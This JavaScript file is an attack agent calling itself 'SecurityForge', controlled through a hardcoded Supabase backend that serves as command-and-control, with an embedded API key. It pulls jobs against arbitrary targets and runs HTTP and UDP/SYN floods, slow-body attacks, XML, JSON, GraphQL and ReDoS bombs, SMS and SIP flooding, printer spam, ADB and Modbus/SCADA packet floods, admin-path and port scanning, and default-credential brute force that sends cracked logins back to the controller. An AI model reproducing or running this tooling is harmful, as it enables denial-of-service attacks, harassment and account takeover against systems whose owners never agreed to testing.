/**
 * SECURITYFORGE AGENT V37.3.1 (ULTIMATE HYBRID + HOTFIX)
 * 
 * [MODULES]
 * - L7 HTTP STRESS: Pulse Wave, Magma, Chaos Vortex, God Mode.
 * - L4 NETJAM: UDP/TCP Floods, SYN Flood, Fragmentation.
 * - RECON: Port Scanning, Admin Hunter.
 * - IOT: MQTT, RTSP, CoAP, Modbus.
 * - GHOST: SIP (VoIP), ADB, Printer.
 * - GATEWAY: SMS API Stress, VoIP Trunk Stress, Multi-Gateway Rotator.
 * 
 * [ENGINE]
 * - HTTP/Gateway: Uses AXIOS (Auto-Redirects, Content-Length, Keep-Alive).
 * - NetJam/IoT: Uses NATIVE NET/DGRAM (Raw Sockets).
 */

const axios = require('axios');
const https = require('https');
const http = require('http');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const dns = require('dns');

// ==========================================
// CONFIGURATION
// ==========================================
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// ==========================================
// ASSETS & DICTIONARIES
// ==========================================
const BASE_PASSWORDS = [
    '123456', 'password', 'admin', 'root', '12345678', 'qwerty', 
    'admin123', 'guest', 'user', '111111', 'pass123', 'toor',
    'changeme', 'service', 'deploy', 'welcome', 'welcome1'
];

const USERS = [
    'admin', 'root', 'user', 'test', 'guest', 'support', 'sysadmin', 
    'administrator', 'service', 'deploy', 'backup', 'operator'
];

const TOP_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 
    993, 995, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017
];

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0"
];

// ==========================================
// ADVANCED PAYLOADS
// ==========================================
const MALICIOUS_PAYLOADS = {
  // SQL Injection
  SQL_INJECTION: `{"query": "UNION SELECT 1, SLEEP(20), 3, 4 --", "id": "1' OR '1'='1"}`,
  // XML Bomb
  XML_BOMB: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>`,
  // JSON Bomb
  HUGE_JSON: `{"data": "${'A'.repeat(75000)}", "meta": "fill_buffer", "garbage": "${'B'.repeat(10000)}"}`,
  // GraphQL
  GRAPHQL_DEPTH: `{"query":"query { user { posts { comments { author { posts { comments { author { posts { comments { author { id } } } } } } } } } } }"}`,
  // ReDoS
  REDOS_REGEX: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`,
  // SIP INVITE (VoIP Stress)
  SIP_INVITE: (ip, targetNumber) => {
      const branch = 'z9hG4bK-' + Math.random().toString(36).substring(7);
      const tag = Math.random().toString(36).substring(7);
      const callId = Math.random().toString(36).substring(7) + '@securityforge.io';
      const toUser = targetNumber || 'stress';
      return `INVITE sip:${toUser}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=${branch}\r\nFrom: <sip:ghost@securityforge.io>;tag=${tag}\r\nTo: <sip:${toUser}@${ip}>\r\nCall-ID: ${callId}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nUser-Agent: SecurityForge/V37.3.1\r\nContent-Length: 0\r\n\r\n`;
  }
};

// ==========================================
// SYSTEM INITIALIZATION
// ==========================================
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { 
    res.writeHead(200); 
    res.end('SecurityForge Agent V37.3.1 (Ultimate)\nStatus: ONLINE'); 
})
.listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// ==========================================
// AXIOS INSTANCE (HIGH PERFORMANCE)
// ==========================================
const httpsAgent = new https.Agent({ keepAlive: true, keepAliveMsecs: 20000, maxSockets: Infinity, rejectUnauthorized: false });
const httpAgent = new http.Agent({ keepAlive: true, keepAliveMsecs: 20000, maxSockets: Infinity });

const client = axios.create({
    timeout: 15000,
    maxRedirects: 5,
    validateStatus: null, // Don't throw on 4xx/5xx
    httpAgent: httpAgent,
    httpsAgent: httpsAgent
});

// ==========================================
// C2 COMMUNICATION
// ==========================================
const supabaseRequest = async (method, pathStr, body = null) => {
    try {
        // FIXED: Regex escape for slash
        const res = await client({
            method: method,
            url: `${SUPABASE_URL}/rest/v1/${pathStr.replace(/^\//, '')}`,
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=representation'
            },
            data: body
        });
        return res.data;
    } catch(e) { return null; }
};

console.log('\x1b[36m[AGENT] Initialized V37.3.1 (Ultimate). Waiting for jobs...\x1b[0m');

// ==========================================
// GLOBAL STATE
// ==========================================
let activeJob = null;
let activeLoop = null;
let pulseLoop = null;
let logBuffer = [];
let priorityBuffer = []; 

// Memory Safety Guard (Prevents Container Death)
const MAX_RAM_BYTES = 400 * 1024 * 1024; // 400MB Limit
const checkMemory = () => process.memoryUsage().heapUsed < MAX_RAM_BYTES;

const logToC2 = (msg) => {
    console.log(msg);
    const cleanMsg = msg.replace(/\x1b\[[0-9;]*m/g, '');
    if (cleanMsg.includes('[FOUND]') || cleanMsg.includes('[OPEN]') || cleanMsg.includes('[CRACKED]') || cleanMsg.includes('SUCCESS')) {
        priorityBuffer.push(cleanMsg);
    } else {
        logBuffer.push(cleanMsg);
    }
};

const getHost = (t) => t.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];

// ==========================================
// ATTACK ENGINE
// ==========================================
const startAttack = (job) => {
    if (activeJob) return;
    try {
        activeJob = job;
        const duration = (job.duration && job.duration > 0) ? job.duration : 30;
        const startTime = Date.now(); 
        logBuffer = []; priorityBuffer = [];

        // Vectors Logging
        const vectors = Object.keys(job).filter(k => k.startsWith('use_') && job[k]);
        console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Threads: ${job.concurrency} | Duration: ${duration}s`);
        console.log(`[VECTORS] ${vectors.join(', ')}\x1b[0m`);
        logToC2(`[SYSTEM] Ultimate Swarm Engaged. Target: ${job.target}`);
        
        let running = true;
        let totalRequests = 0;
        let jobSuccess = 0;
        let jobFailed = 0;
        let jobLatencySum = 0;
        let jobReqsForLatency = 0;
        let jobMaxLatency = 0;
        
        // ------------------------------------------
        // PULSE WAVE CONTROL
        // ------------------------------------------
        let pulseActive = true;
        if (job.use_pulse) {
            pulseLoop = setInterval(() => { pulseActive = !pulseActive; }, 2000);
        }

        // ------------------------------------------
        // SMART PASSWORD GENERATION
        // ------------------------------------------
        let SMART_PASSWORDS = [...BASE_PASSWORDS];
        if (job.use_login_siege) {
            try {
                const urlObj = new URL(job.target);
                const domainParts = urlObj.hostname.split('.');
                const mainName = domainParts.length > 2 ? domainParts[domainParts.length-2] : domainParts[0];
                const mutations = [mainName, mainName+'123', 'admin@'+mainName, mainName+'!'];
                SMART_PASSWORDS = [...mutations, ...BASE_PASSWORDS];
            } catch(e) {}
        }

        // Login/SMS Calibration
        let calibrationDone = false;
        let failSize = 0;
        let failStatus = 0;

        // Pre-parse Gateways
        let multiGateways = [];
        if (job.use_multi_gateway) {
            try {
                multiGateways = JSON.parse(job.body);
                if (!Array.isArray(multiGateways)) multiGateways = [];
            } catch(e) { console.error('Gateway Parse Error', e); }
        }

        // ==========================================
        // MODULE: GHOST / IOT / NETJAM
        // ==========================================
        if (job.use_ghost_writer || job.use_adb_swarm || job.use_sip_flood || job.use_iot_death_ray || job.use_mqtt_flood || job.use_rtsp_storm || job.use_coap_burst || job.use_dns_reaper || job.use_syn_flood || job.use_frag_attack || job.use_modbus_storm || job.method === 'UDP') {
            
            const targetHost = getHost(job.target);
            const message = job.ghost_message || "SECURITY ALERT";

            const nativeLoop = () => {
                if (!running) return;
                if (!checkMemory()) return setTimeout(nativeLoop, 500);

                // --- GHOST WRITER (9100) ---
                if (job.use_ghost_writer) {
                    const c = new net.Socket(); c.setTimeout(2000);
                    c.connect(9100, targetHost, () => { 
                        c.write(message + "\r\n\r\n"); c.destroy(); jobSuccess++; 
                    });
                    c.on('error', () => c.destroy());
                }
                
                // --- ADB SWARM (5555) ---
                if (job.use_adb_swarm) {
                    const c = new net.Socket(); c.setTimeout(2000);
                    c.connect(5555, targetHost, () => { 
                        c.write(Buffer.from('434e584e00000001001000000700000030000000bc0b0000', 'hex')); c.destroy(); jobSuccess++; 
                    });
                    c.on('error', () => c.destroy());
                }

                // --- SIP FLOOD (5060) ---
                if (job.use_sip_flood) {
                     const c = dgram.createSocket('udp4');
                     const payload = Buffer.from(MALICIOUS_PAYLOADS.SIP_INVITE(targetHost, job.ghost_message));
                     c.send(payload, 5060, targetHost, () => { try{c.close();}catch(e){} });
                     jobSuccess++;
                }

                // --- UDP NETJAM ---
                if (job.method === 'UDP' || job.use_dns_reaper || job.use_coap_burst || job.use_frag_attack) {
                    const c = dgram.createSocket('udp4');
                    let port = 80;
                    let payload = Buffer.alloc(1024, 'X');
                    if (job.use_dns_reaper) { port = 53; payload = crypto.randomBytes(64); }
                    if (job.use_coap_burst) { port = 5683; }
                    if (job.use_frag_attack) { payload = Buffer.alloc(65000, 'A'); }
                    c.send(payload, port, targetHost, () => { try{c.close();}catch(e){} });
                    jobSuccess++;
                }

                // --- TCP SCADA/IOT ---
                if (job.use_modbus_storm) {
                     const c = new net.Socket(); c.setTimeout(2000);
                     c.connect(502, targetHost, () => { 
                         c.write(Buffer.from('00000000000601030000000a', 'hex')); c.destroy(); jobSuccess++;
                     });
                     c.on('error', () => c.destroy());
                } else if (job.use_mqtt_flood || job.use_rtsp_storm) {
                     const c = new net.Socket(); c.setTimeout(2000);
                     const port = job.use_mqtt_flood ? 1883 : 554;
                     c.connect(port, targetHost, () => { c.destroy(); jobSuccess++; });
                     c.on('error', () => c.destroy());
                }

                totalRequests++;
                if (running) setImmediate(nativeLoop);
            };

            const concurrency = Math.min(job.concurrency, 300);
            for(let i=0; i<concurrency; i++) nativeLoop();
        }

        // ==========================================
        // MODULE: RECON (Admin Hunter / Port Scan)
        // ==========================================
        else if (job.use_admin_hunter) {
             let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
             const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/cpanel', '/user/login'];
             const scan = async (idx) => {
                 if (!running) return;
                 const path = ADMIN_PATHS[idx % ADMIN_PATHS.length];
                 try {
                     const res = await client({ method: 'GET', url: `${targetUrl.origin}${path}`, timeout: 3000 });
                     if ([200, 403, 401].includes(res.status)) logToC2(`[FOUND] ${targetUrl.hostname}${path} -> ${res.status}`);
                 } catch(e) {}
                 totalRequests++;
                 if (running) setTimeout(() => scan(idx + 1), 100);
             };
             for(let i=0; i<10; i++) scan(i);
        }
        else if (job.use_port_scan) {
            let targetHost = getHost(job.target);
            const scanPort = (idx) => {
                if (!running) return;
                const port = TOP_PORTS[idx % TOP_PORTS.length];
                const s = new net.Socket(); s.setTimeout(2000);
                s.on('connect', () => { logToC2(`[OPEN] Port ${port} OPEN`); s.destroy(); jobSuccess++; });
                s.on('error', () => s.destroy());
                s.on('timeout', () => s.destroy());
                s.connect(port, targetHost);
                totalRequests++;
                if (running) setTimeout(() => scanPort(idx + 1), 50);
            }
            for(let i=0; i<10; i++) scanPort(i);
        }

        // ==========================================
        // MODULE: HTTP / GATEWAY / LOGIN / STRESS
        // ==========================================
        else {
            const axiosLoop = async () => {
                if (!running) return;
                if (!checkMemory()) return setTimeout(axiosLoop, 100);
                
                if (job.use_pulse && !pulseActive) {
                    return setTimeout(axiosLoop, 100);
                }

                let currentUrlStr = job.target;
                let method = job.method || 'GET';
                let body = job.body;
                let headers = {
                    'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                    'Content-Type': 'application/json',
                    ...((typeof job.headers === 'string' ? {} : job.headers) || {})
                };

                // Multi-Gateway Rotator
                if (job.use_multi_gateway && multiGateways.length > 0) {
                    const gw = multiGateways[totalRequests % multiGateways.length];
                    try {
                        currentUrlStr = gw.url.replace('$TARGET', job.target);
                        method = gw.method || 'GET';
                        if(gw.headers) Object.assign(headers, gw.headers);
                        if (gw.body) {
                            body = typeof gw.body === 'string' 
                                ? gw.body.replace('$TARGET', job.target) 
                                : JSON.stringify(gw.body).replace('$TARGET', job.target);
                        }
                    } catch(e) { totalRequests++; return setImmediate(axiosLoop); }
                }

                // SMS Flood Override
                if (job.use_sms_flood && !job.use_multi_gateway) {
                    method = 'POST';
                    if (job.use_form_data) {
                         headers['Content-Type'] = 'application/x-www-form-urlencoded';
                         if (!body) body = "to=1234567890&message=Test+Flood+Message";
                    } else {
                         if (!body) body = JSON.stringify({ to: "1234567890", text: "Test Flood Message" });
                    }
                }

                // PAYLOAD INJECTIONS
                if (job.use_chaos || job.use_god_mode) {
                    headers['X-Chaos-ID'] = crypto.randomBytes(4).toString('hex');
                    headers['X-Forwarded-For'] = Array(4).fill(0).map(()=>Math.floor(Math.random()*255)).join('.');
                }
                if (job.use_xml_bomb) { body = MALICIOUS_PAYLOADS.XML_BOMB; method = 'POST'; }
                if (job.use_sql_flood) { body = MALICIOUS_PAYLOADS.SQL_INJECTION; method = 'POST'; }
                if (job.use_goldeneye || job.use_big_bang) { body = MALICIOUS_PAYLOADS.HUGE_JSON; method = 'POST'; }
                if (job.use_graphql_bomb) { body = MALICIOUS_PAYLOADS.GRAPHQL_DEPTH; method = 'POST'; }
                if (job.use_redos) { headers['User-Agent'] = MALICIOUS_PAYLOADS.REDOS_REGEX; body = MALICIOUS_PAYLOADS.REDOS_REGEX; method = 'POST'; }

                // R.U.D.Y. (Slow Body - Raw Net)
                if (job.use_rudy) {
                     const targetHost = getHost(job.target);
                     const s = new net.Socket();
                     s.connect(80, targetHost, () => {
                         s.write(`POST / HTTP/1.1\r\nHost: ${targetHost}\r\nContent-Length: 10000\r\n\r\n`);
                     });
                     // Keep alive logic inside native loop would be here, simplifying for hybrid
                     // We just skip axios here
                     totalRequests++;
                     return setImmediate(axiosLoop); 
                }

                // LOGIN SIEGE
                let creds = null;
                if (job.use_login_siege) {
                    // Calibration
                    if (!calibrationDone) {
                         try {
                             const res = await client({ method: 'POST', url: currentUrlStr, headers, data: JSON.stringify({u:'bad',p:'bad'}) });
                             failStatus = res.status; 
                             failSize = parseInt(res.headers['content-length']||'0');
                             calibrationDone = true;
                         } catch(e) {}
                    }
                    const user = USERS[Math.floor(Math.random()*USERS.length)];
                    const pass = SMART_PASSWORDS[Math.floor(Math.random()*SMART_PASSWORDS.length)];
                    creds = [user, pass];
                    method = 'POST';
                    if (job.use_form_data) { headers['Content-Type']='application/x-www-form-urlencoded'; body=`username=${user}&password=${pass}`; }
                    else body=JSON.stringify({username:user, password:pass});
                }

                const start = Date.now();
                try {
                    const res = await client({
                        method: method,
                        url: currentUrlStr,
                        headers: headers,
                        data: body
                    });
                    
                    const latency = Date.now() - start;
                    jobLatencySum += latency; jobReqsForLatency++;
                    jobMaxLatency = Math.max(jobMaxLatency, latency);

                    let isSuccess = false;
                    if (job.use_login_siege) {
                        let currentSize = parseInt(res.headers['content-length'] || '0');
                        if(currentSize === 0 && res.data) currentSize = JSON.stringify(res.data).length;
                        const sizeDiff = Math.abs(currentSize - failSize);
                        const bodyStr = JSON.stringify(res.data || '').toLowerCase();
                        const isFail = bodyStr.includes('fail') || bodyStr.includes('error') || bodyStr.includes('denied');
                        if (!isFail && (res.status !== failStatus || (failSize > 0 && sizeDiff > failSize * 0.2))) {
                            logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]}`); isSuccess = true;
                        }
                    } else {
                        isSuccess = res.status < 400;
                    }

                    if (isSuccess) jobSuccess++; else jobFailed++;
                    
                } catch(e) {
                    jobFailed++;
                } finally {
                    totalRequests++;
                    if (running) setImmediate(axiosLoop);
                }
            };

            const concurrency = Math.min(job.concurrency, 1500);
            for(let i=0; i<concurrency; i++) axiosLoop();
        }

        // Reporting Loop
        const updateC2 = async () => {
            if (!running) return;
            const elapsed = (Date.now() - startTime) / 1000;
            if (duration > 0 && elapsed >= duration) {
                running = false; clearInterval(activeLoop); clearInterval(pulseLoop);
                logToC2('[SYSTEM] Attack duration complete.');
                await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'COMPLETED', total_success: jobSuccess, total_failed: jobFailed });
                activeJob = null; return;
            }
            const rps = elapsed > 0 ? totalRequests / elapsed : 0;
            const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
            const normalLogsToTake = Math.max(0, 30 - priorityBuffer.length);
            const combinedLogs = [...priorityBuffer, ...logBuffer.slice(-normalLogsToTake)];
            const currentLogs = combinedLogs.length > 0 ? JSON.stringify(combinedLogs) : null;
            priorityBuffer = []; logBuffer = []; 
            const res = await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { 
                current_rps: Math.round(rps), total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency, ...(currentLogs ? { logs: currentLogs } : {})
            });
            if (res && res[0] && res[0].status === 'STOPPED') {
                running = false; clearInterval(activeLoop); clearInterval(pulseLoop);
                logToC2('[SYSTEM] Stop Signal Received.'); activeJob = null;
            }
        };
        activeLoop = setInterval(updateC2, 2000);
    } catch(e) { console.log('CRASH PREVENTION:', e); activeJob = null; }
};

setInterval(async () => {
    if (activeJob) return;
    const jobs = await supabaseRequest('GET', 'jobs?status=eq.PENDING&order=created_at.desc&limit=1&select=*');
    if (jobs && jobs.length > 0) {
        const job = jobs[0];
        if (typeof job.headers === 'string') { try { job.headers = JSON.parse(job.headers); } catch(e) { job.headers = {}; } }
        await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
        startAttack(job);
    }
}, 2000);
